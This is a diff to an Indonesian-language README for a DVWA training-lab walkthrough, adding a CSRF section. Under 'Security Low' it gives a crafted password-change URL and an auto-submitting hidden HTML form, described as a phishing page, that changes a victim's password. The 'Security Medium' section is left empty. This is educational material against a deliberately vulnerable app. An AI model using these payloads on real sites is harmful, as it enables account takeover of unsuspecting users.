@@ -32,3 +32,35 @@ Di level ini kita hanya bisa mengeksekusi 1 perintah saja
 ```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%203.JPG)
+
+## CSRF
+Cross-site request forgery atau Pemalsuan permintaan lintas situs adalah celah keamanan web yang memungkinkan penyerang membujuk pengguna untuk melakukan tindakan yang tidak ingin mereka lakukan.
+
+### Security Low
+Mengganti password pengguna menjadi **test** lewat link
+```sh
+http://<IP>/DVWA/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change
+```
+
+Mengganti password pengguna menjadi **test123** lewat halaman palsu (phising). Silahkan Edit dan simpan kode dibawah ini dengan **nama_file.html**
+```sh
+<html>
+    <body>
+        <form action="http://<IP>/DVWA/vulnerabilities/csrf" method="GET">
+            <input type="hidden" name="password_new" value="test123" />
+            <input type="hidden" name="password_conf" value="test123" />
+            <input type="hidden" name="Change" value="Change" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%204.JPG)
+
+### Security Medium
+
+
+Referensi: https://portswigger.net/web-security/learning-path
